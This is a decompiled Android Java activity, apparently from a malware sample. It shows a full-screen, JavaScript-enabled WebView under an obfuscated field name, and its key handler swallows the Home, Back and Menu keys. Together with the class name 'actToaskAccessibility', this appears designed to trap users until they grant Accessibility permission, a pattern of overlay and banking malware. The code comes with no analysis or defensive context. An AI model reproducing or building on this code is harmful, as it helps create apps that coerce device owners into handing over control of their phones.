/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Context
 *  android.os.Bundle
 *  android.view.KeyEvent
 *  android.view.View
 *  android.webkit.WebChromeClient
 *  android.webkit.WebSettings
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 */
package com.example.mmm.Activity;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.example.mmm.Activity.actToaskAccessibility$MyWebChromeClient;
import com.example.mmm.Activity.actToaskAccessibility$MyWebViewClient;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public class actToaskAccessibility
extends Activity {
    utils utl = new utils();
    constants consts = new constants();
    WebView carpet$;

    public void onBackPressed() {
        super.onBackPressed();
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.carpet$ = new WebView((Context)this);
        this.carpet$.getSettings().setJavaScriptEnabled(true);
        this.carpet$.setScrollBarStyle(0);
        this.carpet$.setWebViewClient((WebViewClient)new actToaskAccessibility$MyWebViewClient(this, 0));
        this.carpet$.setWebChromeClient((WebChromeClient)new actToaskAccessibility$MyWebChromeClient(this, 0));
        this.carpet$.loadUrl("");
        this.setContentView((View)this.carpet$);
    }

    public void onDestroy() {
        super.onDestroy();
        this.carpet$.removeAllViewsInLayout();
        this.carpet$.removeAllViews();
        this.carpet$.destroy();
        this.carpet$ = null;
        this.finish();
    }

    public boolean onKeyDown(int n2, KeyEvent keyEvent) {
        if (n2 == 3) {
            return true;
        }
        if (n2 == 4) {
            return true;
        }
        if (n2 != 82) return false;
        return true;
    }

    protected void onStart() {
        super.onStart();
    }

    protected void onStop() {
        super.onStop();
    }
}

